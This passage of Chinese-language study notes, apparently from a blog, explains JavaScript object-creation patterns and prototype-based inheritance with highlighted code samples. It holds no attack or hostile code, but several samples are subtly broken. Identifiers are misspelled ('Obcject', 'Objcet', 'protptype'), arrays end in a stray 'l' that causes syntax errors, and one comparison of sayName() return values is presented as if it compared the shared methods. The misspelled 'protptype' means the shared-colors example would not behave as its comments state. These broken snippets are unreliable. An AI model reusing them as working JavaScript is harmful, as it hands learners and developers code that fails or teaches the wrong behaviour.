class=\"hljs-params\">name,age</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=sayName;<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">sayName</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>构造函数内部将sayName属性设置成全局的sayName函数。</p>\n<p>新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；</p>\n<p>更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；</p>\n</blockquote>\n<h5 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h5><blockquote>\n<p>我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。</p>\n<p>Prototype就是通过调用构造函数而创建的那个对象实例的原型对象；</p>\n<p>使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">23</span>;<br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>&#125;;<br><br><span class=\"hljs-keyword\">var</span> person1=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br><span class=\"hljs-keyword\">var</span> person2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br>person1.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span><br>person2.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Jack&quot;</span><br>person1.<span class=\"hljs-title function_\">sayName</span>();   <span class=\"hljs-comment\">//&quot;Martin&quot;</span><br>person2.<span class=\"hljs-title function_\">sayName</span>();\t<span class=\"hljs-comment\">//&quot;Jack&quot;</span><br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person1.<span class=\"hljs-title function_\">sayName</span>()==person2.<span class=\"hljs-title function_\">sayName</span>())\t<span class=\"hljs-comment\">//true</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"理解原型对象\"><a href=\"#理解原型对象\" class=\"headerlink\" title=\"理解原型对象\"></a>理解原型对象</h5><blockquote>\n<p>无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。</p>\n<p>默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。</p>\n<p>举前面的例子：</p>\n<p>Person.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/08/953a324fdcd4fa42.png\"></p>\n<blockquote>\n<p>当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；</p>\n<p>原型对象中的属性值不变；只会修改实例中的属性；</p>\n<p>使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；</p>\n<p>使用hasOwnProperty()来检查属性值是来自于原型还是实例；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/08/b6a6f03230b36450.png\"></p>\n<h5 id=\"原型与in操作符\"><a href=\"#原型与in操作符\" class=\"headerlink\" title=\"原型与in操作符\"></a>原型与in操作符</h5><blockquote>\n<p>有两种方式使用in操作符：单独使用和for-in循环使用；</p>\n<p>单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；</p>\n<p>tips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；</p>\n<p>for-in中使用：返回的是通过对象访问的，可以枚举的属性；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//获得对象上所有的可枚举实例</span><br>object.<span class=\"hljs-title function_\">keys</span>();<br><br><span class=\"hljs-keyword\">var</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>();<br><span class=\"hljs-keyword\">var</span> pKeys=<span class=\"hljs-title class_\">Obcject</span>.<span class=\"hljs-title function_\">keys</span>(p);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"更简单的原型语法\"><a href=\"#更简单的原型语法\" class=\"headerlink\" title=\"更简单的原型语法\"></a>更简单的原型语法</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//简写prototype</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\"></span>)&#123;&#125;<br><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer&quot;</span>,<br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;;<br><br><span class=\"hljs-comment\">//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；</span><br><span class=\"hljs-comment\">//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；</span><br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=&#123;<br>    <span class=\"hljs-attr\">constructor</span>:<span class=\"hljs-title class_\">Person</span>,<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer&quot;</span>,<br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"组合使用：构造函数模式和原型模式\"><a href=\"#组合使用：构造函数模式和原型模式\" class=\"headerlink\" title=\"组合使用：构造函数模式和原型模式\"></a>组合使用：构造函数模式和原型模式</h5><blockquote>\n<p>构造函数用于定义实例属性；原型模式用于定义方法和共享属性；</p>\n<p>共享方法，但是每个实例有自己的属性副本；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span> = age; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span> = job; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">friends</span> = [<span class=\"hljs-string\">&quot;Shelby&quot;</span>, <span class=\"hljs-string\">&quot;Court&quot;</span>]; <br>&#125; <br><span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = &#123; <br> constructor : <span class=\"hljs-title class_\">Person</span>, <br> sayName : <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>); <br> &#125; <br>&#125; <br></code></pre></td></tr></table></figure>\n\n<h5 id=\"动态原型模式\"><a href=\"#动态原型模式\" class=\"headerlink\" title=\"动态原型模式\"></a>动态原型模式</h5><blockquote>\n<p>通过将所有信息封装到构造函数，再构造函数中初始化原型；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span> = age; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span> = job; <br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>!=<span class=\"hljs-string\">&quot;function&quot;</span>)&#123;<br>        <span class=\"hljs-title class_\">Person</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>\n\n<h5 id=\"寄生构造函数\"><a href=\"#寄生构造函数\" class=\"headerlink\" title=\"寄生构造函数\"></a>寄生构造函数</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name, age, job</span>)&#123; <br> <span class=\"hljs-keyword\">var</span> o = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>(); <br> o.<span class=\"hljs-property\">name</span> = name; <br> o.<span class=\"hljs-property\">age</span> = age; <br> o.<span class=\"hljs-property\">job</span> = job; <br> o.<span class=\"hljs-property\">sayName</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>); <br> &#125;; <br> <span class=\"hljs-keyword\">return</span> o; <br>&#125; <br><span class=\"hljs-keyword\">var</span> friend = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Nicholas&quot;</span>, <span class=\"hljs-number\">29</span>, <span class=\"hljs-string\">&quot;Software Engineer&quot;</span>); <br>friend.<span class=\"hljs-title function_\">sayName</span>(); <span class=\"hljs-comment\">//&quot;Nicholas&quot; </span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-继承\"><a href=\"#3-继承\" class=\"headerlink\" title=\"3.继承\"></a>3.继承</h3><ul>\n<li>接口继承：只继承方法签名；</li>\n<li>实现继承：继承实际方法；</li>\n</ul>\n<p>ES只支持实现继承，主要依靠原型链实现；</p>\n<h4 id=\"（1）原型链\"><a href=\"#（1）原型链\" class=\"headerlink\" title=\"（1）原型链\"></a>（1）原型链</h4><blockquote>\n<p>利用原型让一个引用类型继承另一个引用类型的属性和方法；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//原型链基本模式</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>=<span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>;<br>&#125;;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>=<span class=\"hljs-literal\">false</span>;<br>&#125;<br><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>();\t\t<span class=\"hljs-comment\">//子类的原型是父类的实例；子类获得父类的所有属性和方法；</span><br><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSubValue</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>;<br>&#125;;<br><br><span class=\"hljs-keyword\">var</span> instacne=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(instacne.<span class=\"hljs-title function_\">getSuperValue</span>());\t\t<span class=\"hljs-comment\">//true;</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/11/606aeed6b87048a8.png\"></p>\n<ul>\n<li>别忘记默认的原型</li>\n</ul>\n<blockquote>\n<p>所有引用类型都默认继承Object；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/11/ccdc684bf208d6d1.png\"></p>\n<ul>\n<li>确定原型和实例的关系</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">instance <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Object</span>;<br><span class=\"hljs-title class_\">Objcet</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-title function_\">isPrototypeOf</span>(instance);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>谨慎的定义代码</li>\n</ul>\n<blockquote>\n<p>子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；</p>\n<p>不管怎样，给原型添加的代码一定要放在替换原型语句之后；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span> = <span class=\"hljs-literal\">true</span>; <br>&#125; <br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>; <br>&#125;; <br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span> = <span class=\"hljs-literal\">false</span>; <br>&#125; <br><br><span class=\"hljs-comment\">//继承了 SuperType </span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>(); <br><span class=\"hljs-comment\">//!!!!添加新方法</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSubValue</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>; <br>&#125;; <br><span class=\"hljs-comment\">//重写超类型中的方法</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>; <br>&#125;; <br><span class=\"hljs-keyword\">var</span> instance = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>(); <br><span class=\"hljs-title function_\">alert</span>(instance.<span class=\"hljs-title function_\">getSuperValue</span>()); <span class=\"hljs-comment\">//false </span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Notice\"><a href=\"#Notice\" class=\"headerlink\" title=\"Notice!!!\"></a>Notice!!!</h5><p>使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span> = <span class=\"hljs-literal\">true</span>; <br>&#125; <br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>; <br>&#125;; <br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span> = <span class=\"hljs-literal\">false</span>; <br>&#125; <br><span class=\"hljs-comment\">//继承了 SuperType </span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>(); <br><span class=\"hljs-comment\">//使用字面量添加新方法，会导致上一行代码无效</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = &#123; <br> getSubValue : <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>; <br> &#125;, <br> someOtherMethod : <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>; <br> &#125; <br>&#125;; <br><span class=\"hljs-keyword\">var</span> instance = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>(); <br><span class=\"hljs-title function_\">alert</span>(instance.<span class=\"hljs-title function_\">getSuperValue</span>()); <span class=\"hljs-comment\">//error! </span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>原型链的问题</li>\n</ul>\n<blockquote>\n<p>问题来自于包含引用类型值的原型；</p>\n<p>包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；</p>\n<p>在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">colors</span>=[<span class=\"hljs-string\">&#x27;red&#x27;</span>,<span class=\"hljs-string\">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><span class=\"hljs-comment\">//子类原型设为父类</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\">protptype</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>();<br><span class=\"hljs-keyword\">var</span> instance1=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-comment\">//所有的子都会共享colors；</span><br>instance1.<span class=\"hljs-property\">colors</span>.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-string\">&#x27;black&#x27;</span>);<br><span class=\"hljs-title function_\">alert</span>(instance1.<span class=\"hljs-property\">colors</span>);\t\t\t<span class=\"hljs-comment\">//red\\gren\\black</span><br><br><span class=\"hljs-keyword\">var</span> instance2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-title function_\">alert</span>(instance2.<span class=\"hljs-property\">colors</span>);\t\t\t<span class=\"hljs-comment\">//red\\green\\black</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"（2）借用构造函数\"><a href=\"#（2）借用构造函数\" class=\"headerlink\" title=\"（2）借用构造函数\"></a>（2）借用构造函数</h4><blockquote>\n<p>伪造对象或者经典继承；</p>\n<p>在子类构造函数的内部调用超类型构造函数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">colors</span>=[<span class=\"hljs-string\">&#x27;red&#x27;</span>,<span class=\"hljs-string\">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-title function_\">call</span>(<span class=\"hljs-variable language_\">this</span>);\t<span class=\"hljs-comment\">//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；</span><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> ins=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br>ins.<span class=\"hljs-property\">colors</span>.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-string\">&quot;black&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">colors</span>);\t<span class=\"hljs-comment\">//red.green.black;</span><br><span 